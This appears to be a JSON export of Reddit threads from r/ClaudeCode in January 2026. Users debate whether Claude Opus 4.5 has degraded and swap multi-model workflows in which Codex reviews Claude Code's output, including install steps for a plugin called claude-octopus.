          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzwa0g8",
          "author": "AvecLesAigles",
          "text": "Now Claude spends full quota of my $20 sub in only 6 answers... It's ridiculous",
          "score": 1,
          "created_utc": "2026-01-16 10:17:52",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzx5v9q",
          "author": "bier0",
          "text": "Please don't make me start using Codex, we're tight CC",
          "score": 1,
          "created_utc": "2026-01-16 13:58:45",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzzfuul",
          "author": "WiggyWongo",
          "text": "Lmao here we go again. Literally every single model released since gpt-4 has this cycle.\n\n\"OH WOW IT'S SO AMAZING AND THE BEST\"\nThen a few weeks later\n\"WOW WHY DID THEY NERF THE MODEL?! THIS IS TRASH!\"\n\nThey didn't nerf anything. You're just experiencing a skill issue and a project with a larger context. Opus 4.5 hasn't changed. Basically, just like with 4o psychopaths on chatgptcomplaints, you're delusional for some reason or another.",
          "score": 1,
          "created_utc": "2026-01-16 20:12:41",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzzn2u1",
          "author": "BetterAd7552",
          "text": "Same here. Also December, it was hungry to be accurate, complete and performance was just amazing.\n\nThe last few weeksâ€¦ something broke. Itâ€™s not the same. A real shame.",
          "score": 1,
          "created_utc": "2026-01-16 20:46:48",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o00qrq9",
          "author": "perpdaddyy",
          "text": "The difference is staggering. Within the last week Iâ€™ve had start using my brain again to promptâ€¦ but back in December man, Opus felt like AGI.\n\nReally just hoping for the other LLM companies to release rly good specific coding models so we all donâ€™t have to chained to Anthrorpic",
          "score": 1,
          "created_utc": "2026-01-17 00:08:06",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o019anb",
          "author": "Extra-Record7881",
          "text": "the only reason i am not committing my self to a $200 plan and sticking with $100 is precisly this. They screw up models and i am locked in with a horrible model for thr rest of the month.",
          "score": 1,
          "created_utc": "2026-01-17 02:01:22",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o022dt4",
          "author": "BryanHChi",
          "text": "I have been using it since the day it came out and today and yesterday was the first time Iâ€™ve been yelling at it like are you fucking stupid? Seriously Iâ€™m just building an AI Chatbot for the backend admin of my app and it couldnâ€™t figure out why I couldnâ€™t save images when I was doing a image thing to realize it wasnâ€™t actually trying to save the image after taking it over to ChatGPT 5.2 codex who then one chatted the solution after two hours of going back-and-forth with Claude",
          "score": 1,
          "created_utc": "2026-01-17 05:15:10",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o04n76z",
          "author": "Both-Employment-5113",
          "text": "yeah its literall trash as of now, liek all the other models, how do you work around that? opus cant even fix simple things anymore and does looping errors all the time",
          "score": 1,
          "created_utc": "2026-01-17 16:30:56",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o071do3",
          "author": "IndependentMulberry3",
          "text": "proof pls. Whereâ€™s the standardized eval? Or did you just get used to the bump from the previous model and arenâ€™t feeling the magic any more? If youâ€™re going off â€œhow i feel about itâ€ i donâ€™t buy it.",
          "score": 1,
          "created_utc": "2026-01-17 23:31:17",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o08x7dt",
          "author": "_KangaDrew_",
          "text": "This is exactly how I felt using CS 4.5 in December. It was blowing every other AI out of the water with dead accuracy and pertinent, clear and concise responses. I've picked back up my project from December and this month it's been an absolute debacle. I'm getting OpenAI level dumbfkery and so much time has been wasted with constant course correction. WTF happened???",
          "score": 1,
          "created_utc": "2026-01-18 06:07:26",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0ackmk",
          "author": "bondage-mastermind",
          "text": "I have to agree that this does happen and we are not having a collective pschycotic episode\n\nThere are subredits where people crap at you for saying this, \"this is your prompt\", \"you just got complacent\", etc, but if you know, you know. It's like  having a relative you know very well, and then suddently you can't help but vaguely notice that they are possibly starting to develop signs of dementia\n\nIt's never 100% observable immediately like you could do with a test, but if you're close enough and it's there... you start feeling uneasy",
          "score": 1,
          "created_utc": "2026-01-18 13:30:16",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzqwhhf",
          "author": "IgniterNy",
          "text": "This subreddit community can be really rude, don't let all the people screaming \"skills issue\" get to you, they don't have the ability to be helpful.\n\nAnthropic is buggy, inconsistent and one of the most expensive models around. The reality is that it's about 50/50 reliable. They've had a bug since Christmas of last year and they still can't find the smoking gun that caused the issue. Anthropic isn't here for customers, they don't care about customer service. What they're really interested in is charging without providing service (by locking people out of accounts) and training they're AI model. Don't depend on anything great coming from Anthropic and adjust your workflows so you can use other models when Claude isn't working well",
          "score": 0,
          "created_utc": "2026-01-15 15:55:29",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzqxlc6",
              "author": "domsen123",
              "text": "yeah but 2nd, 3rd llm multiplies the costs for me by two or three :D",
              "score": -1,
              "created_utc": "2026-01-15 16:00:26",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "nzqusl3",
          "author": "TheJudgeOfThings",
          "text": "My context window expires within a prompt or two now and itâ€™s not even capable of running the project anymore. This is insane",
          "score": 1,
          "created_utc": "2026-01-15 15:47:48",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzs60pc",
              "author": "siberianmi",
              "text": "How many MCPs do you have?",
              "score": 2,
              "created_utc": "2026-01-15 19:19:09",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nzsd3ke",
                  "author": "TheJudgeOfThings",
                  "text": "Iâ€™m running a python script and an API call, thatâ€™s IT. Pulling metrics from a CRM.",
                  "score": 2,
                  "created_utc": "2026-01-15 19:51:37",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "nzrvtyx",
          "author": "TheBear8878",
          "text": "AI slop post. \n\nNo human talks like this:\n\nOpus didn't just \"complete tasks.\" It one-shotted my entire existence. Iâ€™d throw a complex, multi-layered architectural coding problem at it, and it would solve it before I even finished my sip of coffee.\n\n\nThis is cringe as fuck.",
          "score": -1,
          "created_utc": "2026-01-15 18:33:43",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzue1vf",
              "author": "turinglurker",
              "text": "thank you. im all on board with ai, but can we stop with this melodramatic phrasing?",
              "score": 3,
              "created_utc": "2026-01-16 02:00:39",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "nzqskat",
          "author": "Autonomy_AI",
          "text": "Stop bitching, start shipping",
          "score": -3,
          "created_utc": "2026-01-15 15:37:34",
          "is_submitter": false,
          "replies": [
            {
              "id": "o04cwpi",
              "author": "RemarkableGuidance44",
              "text": "\"Start Shipping\" - 500 AI Slop has just been shipped today... Cheapest Product Wins!",
              "score": 2,
              "created_utc": "2026-01-17 15:42:06",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o04i47w",
                  "author": "Autonomy_AI",
                  "text": "True it's like why put it out if it's not worth a shit?",
                  "score": 1,
                  "created_utc": "2026-01-17 16:06:45",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "nzquffr",
              "author": "domsen123",
              "text": "no worries.. its already shipped :D",
              "score": 1,
              "created_utc": "2026-01-15 15:46:09",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o08f9r6",
                  "author": "Autonomy_AI",
                  "text": "What is I'll give you some feedback if you do the same for my ios app",
                  "score": 1,
                  "created_utc": "2026-01-18 04:01:22",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "nzqt1nm",
          "author": "256BitChris",
          "text": "Skill issue.",
          "score": -3,
          "created_utc": "2026-01-15 15:39:48",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzqu0f7",
              "author": "domsen123",
              "text": "with using cc or with coding... i would agree with using cc",
              "score": 1,
              "created_utc": "2026-01-15 15:44:14",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "nzropfo",
          "author": "Aggravating_Pinch",
          "text": "My daily prayer is that someone comes up with a half-decent alternative to Claude Code. Anthropic, with its OpenAI pedigree, is untruthworthy and deceitful.",
          "score": 0,
          "created_utc": "2026-01-15 18:02:07",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzvzrxn",
          "author": "SebastianOpp",
          "text": "Why would they? They had to quantize it over the holidays to save money on servers and compute. Theyâ€™re going to do this more often now preparing for the IPO.",
          "score": 0,
          "created_utc": "2026-01-16 08:42:56",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o00khkp",
          "author": "Psychological-Bet338",
          "text": "The new blaming your tools... It's YOU that is the problem. We have been murdering our development because of Claude.",
          "score": 0,
          "created_utc": "2026-01-16 23:32:29",
          "is_submitter": false,
          "replies": []
        }
      ]
    },
    {
      "id": "1qfu7ga",
      "title": "Claude Code + Codex is... really good",
      "subreddit": "ClaudeCode",
      "url": "https://i.redd.it/68nlx41k90eg1.png",
      "author": "Substantial_Wheel909",
      "created_utc": "2026-01-18 00:51:23",
      "score": 174,
      "num_comments": 108,
      "upvote_ratio": 0.95,
      "text": "[External Link]",
      "is_original_content": false,
      "link_flair_text": "Discussion",
      "permalink": "https://reddit.com/r/ClaudeCode/comments/1qfu7ga/claude_code_codex_is_really_good/",
      "domain": "i.redd.it",
      "is_self": false,
      "comments": [
        {
          "id": "o07tcwb",
          "author": "nyldn",
          "text": "I built [https://github.com/nyldn/claude-octopus](https://github.com/nyldn/claude-octopus) to help with this.",
          "score": 19,
          "created_utc": "2026-01-18 01:58:03",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0a6ptw",
              "author": "ahmet-chromedgeic",
              "text": "Sorry, but can you dumb this down a bit? I have a Claude Code and Codex subscription. The readme says just to prompt it in natural language. My understanding is your plugin will select a different model based on the prompt? How will it choose if I just describe it a random backend feature? What do I need to do to trigger the loop where one reviews the code of the other?",
              "score": 2,
              "created_utc": "2026-01-18 12:49:53",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o0b1wji",
                  "author": "nyldn",
                  "text": "TL;DR: Just talk normally. Say â€œbuild Xâ€ for features. Say â€œgrappleâ€ when you want them to debate.\n\n\nWhen you say â€œbuild me a backend featureâ€, the system sees â€œbuildâ€ and routes to:\n\n\tâˆ™\tCodex (GPT) for writing the code\n\tâˆ™\tClaude for reviewing it\nYou donâ€™t pick anything - it just happens.\nKeyword cheat sheet:\n\n\tâˆ™\tâ€œResearchâ€¦â€ or â€œExploreâ€¦â€ â†’ Claude does research\n\tâˆ™\tâ€œBuildâ€¦â€ or â€œImplementâ€¦â€ â†’ Codex builds, Claude reviews\n\tâˆ™\tâ€œReviewâ€¦â€ or â€œAuditâ€¦â€ â†’ Claude reviews\n\tâˆ™\tâ€œGrappleâ€¦â€ or â€œadversarial reviewâ€¦â€ â†’ \n\nThe review loop\nTo trigger the loop where they review each other:\nJust put â€œgrappleâ€ or â€œadversarial reviewâ€ in your prompt:\n\nâ€œUse adversarial review to critique my auth implementationâ€\nThat kicks off:\n\n\t1.\tBoth models propose solutions\n\t2.\tEach critiques the otherâ€™s code\n\t3.\tClaude picks the winner and combines the best parts",
                  "score": 3,
                  "created_utc": "2026-01-18 15:47:57",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o08sped",
              "author": "wolverin0",
              "text": "Id wish I found this earlier. I built mine in a 650~ lines skill. What you think about it?",
              "score": 1,
              "created_utc": "2026-01-18 05:32:31",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o08ysry",
                  "author": "nyldn",
                  "text": "Nice, [https://github.com/wolverin0/claude-skills](https://github.com/wolverin0/claude-skills) should work well alongside claude-octopus,",
                  "score": 1,
                  "created_utc": "2026-01-18 06:20:32",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o0906qp",
                  "author": "nyldn",
                  "text": "I've added your skill into v7.4 of [claude-octopus](https://github.com/nyldn/claude-octopus)Â  to be included going forward",
                  "score": 1,
                  "created_utc": "2026-01-18 06:32:16",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o09pnb8",
              "author": "Hellbink",
              "text": "Interesting, I have a similar workflow Iâ€™ve been using or testing. I am a huge fan of superpowers and Iâ€™ve recently added codex with 5.2 xhigh as a reviewer for the design doc to analyze for gaps/blind spots and catch drifts or issues for the implementation plan and final review. Iâ€™ve not automated this process yet as I want some control while testing it.\n\nHow does Claude-octopus incorporate the superpowers flow? Does it route reviews between the steps and enable discussions between the different cli agents?",
              "score": 1,
              "created_utc": "2026-01-18 10:23:34",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o0b16z9",
                  "author": "nyldn",
                  "text": "Claude Octopus was actually inspired in part by obra/superpowers - it borrowed the discipline skills (TDD, verification, systematic debugging) and built multi-agent orchestration on top.\n\n\nThereâ€™s a 4-phase â€œDouble Diamondâ€ flow:\n\t1.\tProbe (research) â†’ 2. Grasp (define) â†’ 3. Tangle (build) â†’ 4. Ink (deliver)\nBetween phases 3â†’4, thereâ€™s a 75% quality gate. If the implementation scores below that, it blocks and asks for fixes before delivery. You can set this threshold or override it.\n\nDiscussions between CLI agents - yes, thatâ€™s â€œGrappleâ€:\nWhen you say â€œadversarial reviewâ€ or â€œgrappleâ€, it runs a 3-round debate:\n\tâˆ™\tRound 1: Codex proposes, Claude proposes (parallel)\n\tâˆ™\tRound 2: Claude critiques Codexâ€™s code, Codex critiques Claudeâ€™s code\n\tâˆ™\tRound 3: Claude judges and synthesizes the best solution\n\nSo your manual workflow (Codex 5.2 reviewing for gaps/drift) is basically what Grapple automates. The difference is youâ€™d just say â€œgrapple with this design docâ€ instead of manually passing it between tools.",
                  "score": 1,
                  "created_utc": "2026-01-18 15:44:31",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o0atam9",
              "author": "colorscreen",
              "text": "I'm trying this and went through both the setup wizard and the backslash setup to confirm Codex presence but I'm not seeing it trigger Codex at all, even when I use some of the keywords in the README. It's seemingly deferring to Claude subagents for basically everything. I got it to utilize Codex once but had to manually prompt it with some friction. Do you have guidance on this? It could be helpful to have screenshot examples of how one knows the other models are being triggered.",
              "score": 1,
              "created_utc": "2026-01-18 15:05:04",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o0c7g7j",
                  "author": "nyldn",
                  "text": "There's no clear visual indicator in Claude Code showing when Codex/Gemini are being used vs Claude subagents.\n\nUse /debate explicitly for multi-AI analysis (this definitely triggers Codex + Gemini + Claude)\n\nI'll see if I can add Visual feedback showing which AI is responding",
                  "score": 1,
                  "created_utc": "2026-01-18 19:02:25",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o0d2vbo",
              "author": "leevalentine001",
              "text": "Running:  \n/plugin install co@nyldn-plugins\n\nThrows:  \nPlugin \"co\" not found in any marketplace\n\nTried wrapping in quotes but throws the same error. This is Win11 Terminal (Powershell 7). Any ideas?\n\nEdit: Just wanted to clarify I have added the marketplace already. Attempting to add again throws \" Marketplace 'nyldn-plugins' is already installed\".",
              "score": 1,
              "created_utc": "2026-01-18 21:42:16",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o0d78b8",
                  "author": "nyldn",
                  "text": "sorry you caught me updating it and between documentation. I'm just overhauling a few things \n\nThe latest release looks stable:\n\n# Reinstall Manually\n\n[](https://github.com/nyldn/claude-octopus#option-c-reinstall-manually)\n\n    /plugin uninstall claude-octopus\n    /plugin marketplace update nyldn-plugins\n    /plugin install claude-octopus@nyldn-plugins",
                  "score": 1,
                  "created_utc": "2026-01-18 22:02:51",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o085j4r",
              "author": "drutyper",
              "text": "Was going to use this but it requires API usage, either way its a good setup and what im looking for except I'd prefer only CLI access",
              "score": 0,
              "created_utc": "2026-01-18 03:05:01",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o08ba32",
                  "author": "nyldn",
                  "text": "Not at all, it's designed to use subscription auth first, across claude, codex and chatgpt, and failsback and autosenses what you have installed",
                  "score": 3,
                  "created_utc": "2026-01-18 03:37:50",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o07nd5z",
          "author": "nader8ch",
          "text": "Genuine question: what makes codex particularly adept at reviewing the implementation? \n\nCould you not spin up an opus 4.5 sub agent to take care of the review step? Is there something particularly useful about spinning up a different model entirely and would Gemini be a good candidate?\n\nCheers!",
          "score": 9,
          "created_utc": "2026-01-18 01:26:18",
          "is_submitter": false,
          "replies": [
            {
              "id": "o07p27e",
              "author": "Substantial_Wheel909",
              "text": "I think it mostly comes down to the underlying model being arguably better than Opus 4.5. Iâ€™ve seen a lot of positive feedback about 5.2 on X/High, but I still think Claude Code is better overall when it comes to actually building things. In my experience, Codex does seem more thorough, though it can feel slower at times. Iâ€™m not sure whether thatâ€™s because itâ€™s doing more reasoning under the hood or something else. By blending the two, though, you end up getting the best of both worlds.",
              "score": 9,
              "created_utc": "2026-01-18 01:35:15",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o07pqx7",
                  "author": "nader8ch",
                  "text": "That makes sense to me.\n\nTo follow up: is codex reviewing just the code diff or is it initialised in the repo with some contextual awareness. Is it familiar with the repoâ€™s coding standards, business logic etc?",
                  "score": 3,
                  "created_utc": "2026-01-18 01:38:58",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o0c4we2",
                  "author": "martycochrane",
                  "text": "I do a similar thing but with the CodeRabbit CLI instead of Codex. I've mostly moved away from Codex (my sub runs out in a week I think).\n\nI find that Codex can debug things in one shot compared to Claude, but it still just doesn't follow instructions or is as consistent with my code base / style as CC. \n\nCC feels more like a pair programmer that thinks like me, where Codex feels more like a rogue veteran that will go away and come back with the solution, but not how you want it or considering how it fits into the bigger picture.",
                  "score": 1,
                  "created_utc": "2026-01-18 18:50:41",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o085rdr",
              "author": "HugeFinger8311",
              "text": "Iâ€™d also add each model sees different things. Absolutely spin up a sub agent but I find Codex finds different issues every time and misses some that Opus picks up.  More review eyes the better then just get Claude to consolidate them all.",
              "score": 2,
              "created_utc": "2026-01-18 03:06:20",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o0b4ggr",
              "author": "nyldn",
              "text": "When I was doing some benchmarking, I was seeing an increase in fidelity and quality of output by about 30% by using multiple-agent review pipelines. The diversity of thought by other models seems to just help.",
              "score": 2,
              "created_utc": "2026-01-18 16:00:05",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o086c7s",
              "author": "pragmatic_chicken",
              "text": "My workflow does both! Claude asks both Codex and Claude agent to review, combines the reviews and evaluates relative importance of the feedback (prevent scope creep). Codex is always considerably better at finding real issues compared to Claude being pretty good at finding trivial things like â€œupdate readmeâ€",
              "score": 1,
              "created_utc": "2026-01-18 03:09:41",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o09xoo1",
              "author": "OrangeAdditional9698",
              "text": "Codex follows the instructions to the letter, tell it to investigate something in details and it will do it and check EVERYTHING. It takes a long time, but it works well for reviews.\nOn the other end, ask it to find solutions, or if there are unexpected issues and it will fail. Opus is very good for that, which makes it a good coder but bad reviewer.\nOpus will try to find the best and fastest solution, ignoring other things. This means if you ask it to review then it will find one issue and think he's done because he found \"the\" issue. But maybe the actual issue is something else? Codex will try to figure that out and opus won't.\n\nOpus used to be much better and more thorough, but I feel like it has regressed a lot in the past 10 days. Maybe they are paving the way to a newer model? Or they nerfed it for budget reasons",
              "score": 1,
              "created_utc": "2026-01-18 11:36:24",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o0a79cg",
                  "author": "Substantial_Wheel909",
                  "text": "Yeah I've noticed Opus 4.5 sometimes seems to skip stuff",
                  "score": 1,
                  "created_utc": "2026-01-18 12:53:52",
                  "is_submitter": true,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o07suy6",
          "author": "fredastere",
          "text": "Hey im not sure because the naming convention of codex are so bad lmao\n\nBut just to help maybe, in codex make sure to use gpt5.2-xhigh (although you said your projects are fairly simple, perhaps running high or even medium could prove to be more efficient and better,  xhigh over complicates thing).\n\nI do not advise using gpt5.2-codex-xhigh for code review, keep all codex variants for straight implementation \n\nSorry if its all confusing , as it is! Lol",
          "score": 3,
          "created_utc": "2026-01-18 01:55:29",
          "is_submitter": false,
          "replies": [
            {
              "id": "o07u08s",
              "author": "Substantial_Wheel909",
              "text": "I'm using GPT 5.2 xhigh, not the codex variant because I'm not sure if it's true but some people were saying it's quite a bit dumber than the normal version. As for efficiency I'm not really bothered about how long it takes, and I feel like maybe if it was implementation then maybe having the model overthink stuff and possibly do too much then it could pose a problem, but when reviewing you want it to be meticulous and what it has to do is quite well defined, it's not adding anything new just reviewing the code Claude implemented",
              "score": 4,
              "created_utc": "2026-01-18 02:01:36",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o098aob",
                  "author": "fredastere",
                  "text": "Ya perfect and yes definitely agree with you as reviewer going full xhigh definitely makes sense !\n\nAnd ya its not that the codex variant are dumber but i think they are made purely just to implement",
                  "score": 1,
                  "created_utc": "2026-01-18 07:43:22",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o07lb5p",
          "author": "anndrrson",
          "text": "codex IMHO is slower, but i've heard from friends that they're using codex to review their code. i do worry, somewhat, we will see a therac-25 event happen with AI coding on top of AI coding. \\~\\~ that being said, codex is pretty great! i'm not really a \"fan\" of openAI/chatGPT and prefer anthropic/claude as a co. \\~ especially after the recent ads announcement",
          "score": 6,
          "created_utc": "2026-01-18 01:16:14",
          "is_submitter": false,
          "replies": [
            {
              "id": "o07ng5b",
              "author": "Substantial_Wheel909",
              "text": "Yeah, I definitely like Anthropic more as a company. That said, I tend to use a mix of ChatGPT and Claude. I use Claude Code so much that I usually donâ€™t have much quota left for general chatting, so I end up using ChatGPT for that. I also like to reserve Claude for deeper or more thoughtful conversations. There are definitely things I prefer about GPT, and other things I donâ€™t, but overall I find both useful in different ways.",
              "score": 5,
              "created_utc": "2026-01-18 01:26:44",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o09oeux",
                  "author": "anndrrson",
                  "text": "claudes often... brutal honesty is refreshing oftentimes!",
                  "score": 1,
                  "created_utc": "2026-01-18 10:12:18",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o085jhl",
              "author": "HugeFinger8311",
              "text": "100% with you on this but have found using Codex to write reviews to be useful. I actually use both Codex and Kimi. Codex is good. Steady, reliable and slow and Kimi finds some totally random ones. I feel them both a copy of my original prompt and the plan Claude wrote and ask them to review both + look at consistencies in the then a final review for consistency against rest of codebase and recent commits. It helps but each model has gaps.  Havenâ€™t tried MCP to do it yet though I just have a prompt I drop in with the file locations.",
              "score": 2,
              "created_utc": "2026-01-18 03:05:04",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o08irnq",
              "author": "InhaleTheAle",
              "text": "It really depends on what you're doing, in my experience. Codex seems faster and more exacting on certain tasks. I'm sure it depends on how you use it though.",
              "score": 1,
              "created_utc": "2026-01-18 04:23:31",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o08st7t",
          "author": "wolverin0",
          "text": "Hopefully you will find my skill useful https://github.com/wolverin0/claude-skills",
          "score": 2,
          "created_utc": "2026-01-18 05:33:20",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o091736",
          "author": "rair41",
          "text": "[https://github.com/raine/consult-llm-mcp](https://github.com/raine/consult-llm-mcp) allows the same with Gemini CLI, Codex CLI etc.",
          "score": 2,
          "created_utc": "2026-01-18 06:40:56",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o09xm66",
          "author": "vladanHS",
          "text": "I'm using Gemini 3 pro/flash instead, it's cheaper and relatively fast, you usually get a review in 2 minutes, rinse & repeat",
          "score": 2,
          "created_utc": "2026-01-18 11:35:47",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0a8jmq",
              "author": "Substantial_Wheel909",
              "text": "Yeah maybe what I'm using is a bit overkill",
              "score": 1,
              "created_utc": "2026-01-18 13:03:07",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o07lvj6",
          "author": "Ls1FD",
          "text": "I do this as well but for some reason I find the reviews that GPT does by being called by subagents are nowhere near as thorough as going through codex cli itself. I find Claudeâ€™s sub agents themselves harder to control. You give them instructions and they decide to follow them or not. Maybe they have to be guided purely by hooks.\n\nCurrently I have a BMAD review workflow in CC using agents that call Codex and then I follow up with a more through review in Codex CLI.",
          "score": 1,
          "created_utc": "2026-01-18 01:18:54",
          "is_submitter": false,
          "replies": [
            {
              "id": "o07mp33",
              "author": "Substantial_Wheel909",
              "text": "Would using just the main CC agent avoid this?",
              "score": 2,
              "created_utc": "2026-01-18 01:22:59",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o07qc0q",
                  "author": "Ls1FD",
                  "text": "Until its context gets filled and then compacting increases errors. I tried subagents to batch review and fix many stories and issues at once. Iâ€™m trying a new workflow that uses beads and md files to keep track of progress and just let it compact when it wants. Errors introduced will be picked up in the next review, Wiggum style.",
                  "score": 1,
                  "created_utc": "2026-01-18 01:42:11",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o07secm",
                  "author": "Ls1FD",
                  "text": "I think the main problem is that codex works best with plenty of feedback. I find GPT much more detail oriented which is why itâ€™s great for reviews but doesnâ€™t do well with ambiguity. The MCP doesnâ€™t allow for the 2 way communication that allows codex the clarification it needs to do its best. Without that, the first ambiguity it runs into it gets lazy and the quality drops",
                  "score": 1,
                  "created_utc": "2026-01-18 01:53:02",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o07mbb3",
          "author": "Perfect-Series-2901",
          "text": "I do similar thing but not every single task. I think Claude even with opus is lazy and fast. Codex is very slow but detail",
          "score": 1,
          "created_utc": "2026-01-18 01:21:05",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o07n8f2",
          "author": "TheKillerScope",
          "text": "How do you use Claude and Codex in the same session? And how do you decide who does what and when? How do you \"summon\" the right \"person\" for the job?",
          "score": 1,
          "created_utc": "2026-01-18 01:25:37",
          "is_submitter": false,
          "replies": [
            {
              "id": "o07o2ur",
              "author": "Substantial_Wheel909",
              "text": "Itâ€™s a fairly simple workflow, but it does seem to catch issues in Claudeâ€™s work and improve it. Iâ€™m using the Codex MCP server, and the only real setup is telling Claude to report what it changed after implementing something. Codex reviews it, they iterate back and forth until Codex is happy, and thatâ€™s basically it. There are probably better ways to do this, and it might be overkill, but itâ€™s been working pretty well.\n\nhttps://preview.redd.it/xfmywczfg0eg1.png?width=1920&format=png&auto=webp&s=63127d82bdb1a2f3b574f4166d2af0cd3365cc03",
              "score": 3,
              "created_utc": "2026-01-18 01:30:09",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o07psgh",
                  "author": "TheKillerScope",
                  "text": "Cool! Where could I find this Codex MCP please?",
                  "score": 1,
                  "created_utc": "2026-01-18 01:39:12",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o07tug5",
                  "author": "qa_anaaq",
                  "text": "The screenshot shows that the command to review via codex is in the CLAUDE.md file. Could you share that language if possible?",
                  "score": 1,
                  "created_utc": "2026-01-18 02:00:43",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o07nfmi",
          "author": "akuma-_-8",
          "text": "We have an equivalent workflow at work but we use CodeRabbit which is specialized in code review. It also reviews every merge request and gives a nice feedback with some ai prompt to feed directly to Claude Code. They also provide a cli that we can run locally to get feedback and itâ€™s really fast",
          "score": 1,
          "created_utc": "2026-01-18 01:26:39",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o07xbyk",
          "author": "avogeo98",
          "text": "Have you used the claude integration with github? It will review your pull requests automatically, and I like its review style, compared to codex.  \nMost of my dev loop is built around github pull requests and going through a couple of automated review iterations for complex changes.  \nWhen I tried codex reviews, it can catch \"gotcha\" bugs, but for large changes, I found its feedback incredibly dry and pedantic to read, compared to claude.",
          "score": 1,
          "created_utc": "2026-01-18 02:19:58",
          "is_submitter": false,
          "replies": [
            {
              "id": "o07yjm9",
              "author": "Substantial_Wheel909",
              "text": "To be honest I'm a bit rudimentary with my GitHub usage, I just use it to make sure I have it backed up and if I implement something truly horrible I can go back on it. But yeah I should probably try it out.",
              "score": 1,
              "created_utc": "2026-01-18 02:26:40",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o088a30",
          "author": "dwight0",
          "text": "I do this too. I feel like each model gets things 80% right so they each find what the other misses.Â ",
          "score": 1,
          "created_utc": "2026-01-18 03:20:44",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o08lnbx",
          "author": "SkidMark227",
          "text": "I have this setup and then added gemini by hacking in an mcp server for gemini cli as well. They have fun debates and review sessions.",
          "score": 1,
          "created_utc": "2026-01-18 04:42:37",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0a7evy",
              "author": "Substantial_Wheel909",
              "text": "Might have to try this, I have a Copilot sub that I don't really use so maybe I could just use the quota from that",
              "score": 1,
              "created_utc": "2026-01-18 12:54:59",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o08mvnd",
          "author": "WHEREISMYCOFFEE_",
          "text": "I kept reading about Codex + Claude Code being amazing, so I put together a skill that consults different LLMs at key points during the planning and implementation and takes their input into account. For anything related to coding, it goes straight to 5.2 Codex High for a second opinion.\n\nI called the skill /oracles because I find it fun asking the model to consult the oracles when it needs a second opinion and I'm not sure what the best option is. The skill routes the question to one or more models depending the domains the question covers and what each model excels at, like using Gemini 3 Pro for design choices.\n\nI do all of this through OpenRouter and my OpenAI key so there are costs involved, but Claude Code makes it super easy to involve other models and their output at different stages during sessions thanks to hooks.",
          "score": 1,
